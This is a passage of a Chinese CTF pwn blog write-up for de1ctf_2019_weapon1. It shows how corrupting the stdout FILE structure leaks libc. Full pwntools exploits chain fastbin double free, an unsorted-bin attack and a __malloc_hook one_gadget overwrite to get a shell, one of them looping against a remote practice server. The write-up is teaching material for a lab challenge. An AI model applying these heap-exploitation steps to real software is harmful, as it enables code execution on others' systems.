src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820182556220.png" alt="image-20250820182556220"></p><ul><li>接下来寻找附近有没<code>0x7f</code>的堆地址，这样我们就可以修改<code>fd</code>指针到<code>0x7f</code>这个地址处，申请<code>fastbin</code>列表中的堆块就能申请到该位置，这里选用的是下图的地址</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820182959812.png" alt="image-20250820182959812"></p><ul><li>现在我们就进行一下劫持<code>fd</code>、<code>修改stdout结构体的操作</code><ul><li>下面的图一就是劫持<code>fd</code>的操作</li><li>下面的图二就是修改<code>stdout</code>结构体后的结果</li><li>下面的图三就说明修改<code>stdout</code>结构体后已经将libc的地址打印出来了，打印出来后我们就可以处理一下接收</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">2</span>,p16(<span class="number">0x25e5</span>-<span class="number">0x8</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>))</span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,leak)</span><br><span class="line">leak = u64(leak.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_addr = leak - <span class="number">192</span> - libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr---&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">malloc_hook = libc_addr + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">des_addr = malloc_hook - <span class="number">0x23</span> <span class="comment">#- 0x8</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820183253775.png" alt="image-20250820183253775"></p><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820183432516.png" alt="image-20250820183432516"></p><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820183531609.png" alt="image-20250820183531609"></p><h2 id="题目3_分析3">题目3_分析3</h2><ul><li>通过分析<code>2</code>其实就已经将libc的地址泄露出来了，接下来就是继续申请<code>0x60</code>大小的堆块，并且释放堆块，看看程序是否能正常运行。申请和释放完后发现可以正常运行，申请的俩个堆块如下图所示：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">14</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820183900295.png" alt="image-20250820183900295"></p><ul><li>那接下来就直接构造<code>double_free</code>打<code>malloc_hook</code>即可，这里就不多说了。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ogg = [<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>] <span class="comment"># 由于本地和远程的libc有点不同,所以ogg不太一样</span></span><br><span class="line">ogg_ = ogg[<span class="number">2</span>] + libc_addr</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">15</span>,p64(des_addr))</span><br><span class="line"><span class="comment">#rename2(13,p64(des_addr))</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">16</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">16</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">17</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(ogg_)) </span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>本地打的完整<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./de1ctf_2019_weapon1&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.interactive()</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size of weapon:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;input your name:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input idx :&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename</span>(<span class="params">index,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;new content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="comment">#des_addr = 0x555555602025-0x8</span></span><br><span class="line"><span class="comment">#rename(-4,b&#x27;1&#x27;)</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">9</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">rename(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">rename(<span class="number">3</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x50,5,b&#x27;\x50&#x27;)</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">9</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">2</span>,p16(<span class="number">0x25e5</span>-<span class="number">0x8</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>))</span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,leak)</span><br><span class="line">leak = u64(leak.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_addr = leak - <span class="number">192</span> - libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr---&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">malloc_hook = libc_addr + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">des_addr = malloc_hook - <span class="number">0x23</span> <span class="comment">#- 0x8</span></span><br><span class="line"><span class="comment">#system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">delete(5)</span></span><br><span class="line"><span class="string">delete(6)</span></span><br><span class="line"><span class="string">delete(5)</span></span><br><span class="line"><span class="string">add(0x60,12,b&#x27;1&#x27;)</span></span><br><span class="line"><span class="string">rename(5,p64(des_addr))</span></span><br><span class="line"><span class="string">add(0x60,13,b&#x27;1&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x60,12,b&#x27;1&#x27;)</span></span><br><span class="line">ogg = [<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">ogg_ = ogg[<span class="number">2</span>] + libc_addr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">size,index,context</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.send(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete2</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename2</span>(<span class="params">index,context</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">14</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">15</span>,p64(des_addr))</span><br><span class="line"><span class="comment">#rename2(13,p64(des_addr))</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">16</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">16</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">17</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(ogg_))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>但是由于<code>半个字节的</code>随机地址偏移，这就使得打远程需要爆破，尝试一下打远程，打远程使用打本地的偏移其实就能爆破出来：</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820184641010.png" alt="image-20250820184641010"></p><h2 id="题目3_exp">题目3_exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./de1ctf_2019_weapon1&quot;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29028</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index,context</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="comment">#p.interactive()</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;size of weapon:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;input index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;input your name:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;input idx :&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rename</span>(<span class="params">index,context</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;input idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;new content:&#x27;</span>,context)</span><br><span class="line">    <span class="comment"># 利用double_free和堆分水,使得能将堆块放入unsorted_bin中</span></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">9</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">    rename(<span class="number">0</span>,payload)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    rename(<span class="number">3</span>,p8(<span class="number">0x50</span>))</span><br><span class="line">    <span class="comment">#add(0x50,5,b&#x27;\x50&#x27;)</span></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 使用unsorted_bin_attack,使得libc的地址能被写入到fastbin链表中</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">9</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    rename(<span class="number">2</span>,p16(<span class="number">0x25e5</span>-<span class="number">0x8</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 申请到libc地址后修改stdout的IO结构体,并接收地址</span></span><br><span class="line">        add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>))</span><br><span class="line">        leak = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,leak)</span><br><span class="line">        leak = u64(leak.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">        libc_addr = leak - <span class="number">192</span> - libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;libc_addr---&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">        malloc_hook = libc_addr + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        des_addr = malloc_hook - <span class="number">0x23</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment">#system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    delete(5)</span></span><br><span class="line"><span class="string">    delete(6)</span></span><br><span class="line"><span class="string">    delete(5)</span></span><br><span class="line"><span class="string">    add(0x60,12,b&#x27;1&#x27;)</span></span><br><span class="line"><span class="string">    rename(5,p64(des_addr))</span></span><br><span class="line"><span class="string">    add(0x60,13,b&#x27;1&#x27;)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(0x60,12,b&#x27;1&#x27;)</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 再次使用fastbin_double_free,利用malloc_hook打ogg</span></span><br><span class="line">    ogg = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    ogg_ = ogg[<span class="number">3</span>] + libc_addr</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">14</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    delete(<span class="number">13</span>)</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    delete(<span class="number">13</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">15</span>,p64(des_addr))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">16</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">16</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">17</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(ogg_))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="题目4_2025上海市磐石ctf_user">题目4_2025上海市磐石CTF_user</h1><ul><li>题目附件：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载:https://wwsq.lanzoue.com/iAqJG33zvk0d 